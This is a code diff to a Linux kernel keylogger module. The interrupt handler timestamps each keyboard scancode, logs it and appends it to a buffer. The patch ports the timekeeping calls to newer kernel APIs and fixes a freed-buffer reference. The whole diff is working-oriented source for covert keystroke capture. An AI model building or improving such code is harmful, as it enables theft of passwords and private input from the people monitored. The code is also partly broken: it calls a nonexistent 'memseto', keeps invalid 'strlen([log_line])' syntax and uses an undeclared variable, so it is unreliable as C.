@@ -11,6 +11,7 @@
 #include <linux/vmalloc.h>
 #include <linux/interrupt.h>
 #include <linux/time.h>
+#include <linux/timekeeping.h>
 #include <asm/io.h>
 #include "keylogger.h"
 
@@ -47,7 +48,7 @@ static int add_new_entry(char *entry)
 		strcpy(tmp_buff, keylogger_data.log_buffer);
 	strcat(tmp_buff, entry);
 	if (keylogger_data.log_buffer)
-		vfree(log_buffer);
+		vfree(keylogger_data.log_buffer);
 	log_buffer = tmp_buff;
 	return (0);
 }
@@ -123,9 +124,9 @@ void	handle_scancode(struct key_info *key)
 
 int generate_timestamp(char *out)
 {
-	struct timespec ts;
+	struct timespec64 ts;
 	
-	getnstimeofday(&ts);
+	ktime_get_ts64(&ts);
 
 	if (sprintf(out, "%.2d:%.2d:%.2d", (ts.tv_sec/3600) % 24, (ts.tv_sec/60) % 60, ts.tv_sec % 60) < 0)
 	{
@@ -143,11 +144,11 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	char log_line[64];
 	(void)logs;
 
-	bzero(log_line, 64);
+	memseto(log_line, 0, 64);
 	generate_timestamp(log_line);
 	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
-	log_line[strlen([log_ling])] = '\n'; //add a new line at end of our log entry
+	log_line[strlen([log_line])] = '\n'; //add a new line at end of our log entry
 	add_new_entry(log_line);
 	return IRQ_HANDLED;
 }
